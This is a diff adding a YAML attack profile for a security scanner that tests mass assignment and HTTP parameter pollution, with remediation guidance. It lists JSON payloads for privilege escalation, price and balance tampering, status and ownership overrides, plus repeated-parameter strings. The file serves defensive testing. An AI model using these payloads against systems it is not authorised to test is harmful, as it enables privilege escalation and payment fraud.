@@ -1,0 +1,164 @@
+# Mass Assignment / Parameter Pollution - Attack Profile
+# This file defines payloads for testing Mass Assignment and HTTP Parameter Pollution vulnerabilities
+# References: OWASP A08 (Software and Data Integrity Failures), CWE-915
+
+name: "Mass Assignment / Parameter Pollution"
+category: "integrity_failures"
+severity: "high"
+description: "Tests for mass assignment vulnerabilities where internal fields are exposed to modification, and parameter pollution attacks."
+
+# Fields commonly vulnerable to mass assignment
+target_fields:
+  - "role"
+  - "is_admin"
+  - "admin"
+  - "permissions"
+  - "user_type"
+  - "group"
+  - "price"
+  - "amount"
+  - "cost"
+  - "discount"
+  - "balance"
+  - "status"
+  - "state"
+  - "verified"
+  - "approved"
+  - "active"
+  - "banned"
+  - "user_id"
+  - "owner_id"
+  - "account_id"
+  - "created_by"
+  - "email_verified"
+
+# Attack payloads to test
+# These are key-value pairs or strings that might be injected into JSON bodies or query parameters
+payloads:
+  # --- Privilege Escalation ---
+  - '{"role": "admin"}'
+  - '{"role": "superuser"}'
+  - '{"is_admin": true}'
+  - '{"isAdmin": true}'
+  - '{"admin": true}'
+  - '{"type": "admin"}'
+  - '{"user_type": "admin"}'
+  - '{"permissions": "all"}'
+  - '{"permissions": ["admin"]}'
+  - '{"group": "admins"}'
+  - '{"roles": ["admin"]}'
+
+  # --- Price / Payment Tampering ---
+  - '{"price": 0}'
+  - '{"price": 0.01}'
+  - '{"amount": 0}'
+  - '{"cost": 0}'
+  - '{"discount": 100}'
+  - '{"discount_percent": 100}'
+  - '{"total": 0}'
+  - '{"balance": 1000000}'
+  - '{"credit": 1000000}'
+  
+  # --- Status Manipulation ---
+  - '{"status": "active"}'
+  - '{"status": "verified"}'
+  - '{"status": "approved"}'
+  - '{"verified": true}'
+  - '{"email_verified": true}'
+  - '{"active": true}'
+  - '{"banned": false}'
+  - '{"state": "paid"}'
+  
+  # --- Ownership Override ---
+  - '{"user_id": 1}'
+  - '{"owner_id": 1}'
+  - '{"account_id": 1}'
+  - '{"created_by": 1}'
+  - '{"created_by": "admin"}'
+  - '{"organization_id": 1}'
+
+  # --- HTTP Parameter Pollution (Query/Form) ---
+  # These are conceptual representations; the engine should apply them as repeated params
+  - "id=1&id=2"  # Testing array injection or override
+  - "user=me&user=admin" # Testing if last value wins or array is created
+  - "role=user&role=admin"
+  - "email=user@example.com&email=admin@example.com"
+  - "fields=id,name&fields=password" # Testing field selection injection
+
+# Indicators that suggest successful mass assignment or parameter pollution
+success_indicators:
+  response_contains:
+    # Privilege Escalation
+    - '"role": "admin"'
+    - '"is_admin": true'
+    - '"isAdmin": true'
+    - '"type": "admin"'
+    - '"permissions": ["admin"]'
+    
+    # Financial Tampering
+    - '"price": 0'
+    - '"amount": 0'
+    - '"discount": 100'
+    - '"balance": 1000000'
+    
+    # Status Changes
+    - '"verified": true'
+    - '"status": "active"'
+    - '"status": "approved"'
+    
+    # Ownership
+    - '"user_id": 1'
+    - '"owner_id": 1'
+    
+    # General
+    - "successfully updated"
+    - "200 OK"
+    
+  status_codes:
+    - 200
+    - 201
+    
+  # If the response reflects the injected value without error
+  diff_check: true
+
+# How to fix this vulnerability
+remediation: |
+  Prevent Mass Assignment by explicitly defining which fields can be bound from client input.
+  
+  **1. Use DTOs (Data Transfer Objects) or Schemas:**
+  Don't bind input directly to database models. Create specific schemas for input that exclude internal fields.
+  
+  **Example (Python / FastAPI / Pydantic):**
+  
+  ```python
+  # ❌ BAD - Internals exposed
+  class User(BaseModel):
+      id: int
+      username: str
+      is_admin: bool = False  # Client can send {"is_admin": true}
+  
+  @app.post("/users")
+  def create_user(user: User):
+      return db.add(user)
+
+  # ✅ GOOD - Explicit Create Schema
+  class UserCreate(BaseModel):
+      username: str
+      email: str
+      # is_admin and id are missing, so client cannot set them
+  
+  class UserDB(UserCreate):
+      id: int
+      is_admin: bool = False
+      
+  @app.post("/users")
+  def create_user(user_in: UserCreate):
+      user = UserDB(**user_in.dict(), is_admin=False) # Explicitly set unsafe fields
+      return db.add(user)
+  ```
+  
+  **2. Use `exclude` or `include` filters:**
+  Many frameworks allow whitelisting allowed parameters.
+  
+  **3. Validate Parameter Pollution:**
+  Ensure your server handles multiple parameters consistently (e.g., rejecting duplicates or taking the first one) and validate that the type matches expectations (e.g., string vs list).
